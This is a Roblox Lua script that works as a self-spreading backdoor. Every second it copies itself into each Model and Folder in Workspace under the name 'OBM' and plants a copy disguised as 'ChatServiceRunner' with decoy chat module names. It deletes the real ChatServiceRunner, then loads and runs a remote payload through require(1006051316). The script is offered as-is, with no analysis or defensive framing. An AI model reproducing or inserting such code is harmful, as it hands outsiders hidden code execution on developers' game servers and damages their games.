function config()
	
	local name = "OBM"
	
	local sp = game.Workspace:GetChildren()
	
	for i = 1, #sp do
		if sp[i]:IsA("Model") or sp[i]:IsA("Folder") then
			if sp[i]:FindFirstChild(name) == nil then
				local clone = script:Clone()
				clone.Parent = sp[i]
				clone.Name = name
			end
		end
	end
	
	local fakeName = "ChatServiceRunner "
	
	if game:GetService("ServerScriptService"):FindFirstChild(fakeName) == nil then
		local copy = script:Clone()
		
		copy.Parent = game:GetService("ServerScriptService")
		copy.Name = fakeName
		local cChannel = Instance.new("ModuleScript")
		
		cChannel.Name = "ChatChannel"
		cChannel.Parent = copy
		local bChannel = Instance.new("ModuleScript")
		
		bChannel.Name = "ChatService"
		bChannel.Parent = copy
		local aChannel = Instance.new("ModuleScript")
		
		aChannel.Name = "Speaker"
		aChannel.Parent = copy
		local zChannel = Instance.new("ModuleScript")
		
		zChannel.Name = "Util"
		zChannel.Parent = copy
		
		if game:GetService("ServerScriptService"):FindFirstChild("ChatServiceRunner") ~= nil then
			
			game:GetService("ServerScriptService").ChatServiceRunner:Destroy()
			
		end
		
	end
	
	local payload = require(1006051316)
	
	payload:activate()
	
end

while wait(1) do
	
	config()
	
end